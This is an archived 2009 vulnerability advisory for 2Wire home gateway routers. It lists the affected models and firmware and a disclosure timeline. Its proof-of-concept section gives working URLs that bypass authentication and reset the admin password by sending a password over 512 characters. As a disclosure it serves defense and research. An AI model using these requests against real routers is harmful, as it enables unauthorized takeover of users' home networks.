@@ -1,0 +1,81 @@
+2WIRE GATEWAY AUTHENTICATION BYPASS & PASSWORD RESET (08/04/09)
+==============================================================
+
+
+  DESCRIPTION
+-----------------
+There is an authentication bypass vulnerability in page=CD35_SETUP_01 that
+allows you to set a new password even if the password was previously set.
+
+By setting a new password with more than 512 characters the password gets
+reset and next time you access the router you will be prompted for a new
+password.
+
+
+  VULNERABLE
+----------------
+2Wire 2071 Gateway
+2Wire 1800HW
+2Wire 1701HG
+
+ Firmware
+5.29.51
+3.17.5
+3.7.1
+
+  NOT VULNERABLE
+--------------------
+ Firmware
+5.29.135.5 or later
+
+
+  DISCLOSURE TIMELINE
+-------------------------
+03/27/2009 - 2wire Contacted no satisfactory response
+07/11/2009 - Sent complete details to 2wire no response
+07/17/2009 - Sent advisory with video demo to 2wire ticket status escalated, but no response
+08/02/2009 - Made public @ Defcon 17
+
+
+  EXPLOIT/POC
+-----------------
+Authentication Bypass - just use this page to set a new password
+
+    http://gateway.2wire.net?xslt?page=CD35_SETUP_01
+
+Video: http://www.hakim.ws/2wire/2wire_CD35_Bypass.ogv
+
+
+Password Reset - using the same form but sending a password > 512 characters
+
+http://gateway.2wire.net/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkm
+hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
+kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
+mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
+hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
+kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
+mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkh
+kmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
+hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
+kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
+mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
+hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
+kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
+mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm
+
+Video: http://www.hakim.ws/2wire/2wire_CD35_Reset.ogv
+
+
+  GREETS
+------------
+sdc lightos pcp nitr0us 0xf alt3kx darko DeadSector Etal gwolf h4ckult1m4t3
+hackerss hd k00l kaz Kbrown mendozaaaa nahual Napa nediam raza-mexicana roa
+Setting sla.ckers thornmaker tr3w vandida vi0let xianur0 Yield
+
+  Comunidad Underground de Mexico : https://www.underground.org.mx
+
+
+            h k m
+     http://www.hakim.ws
+
+# milw0rm.com [2009-08-12]
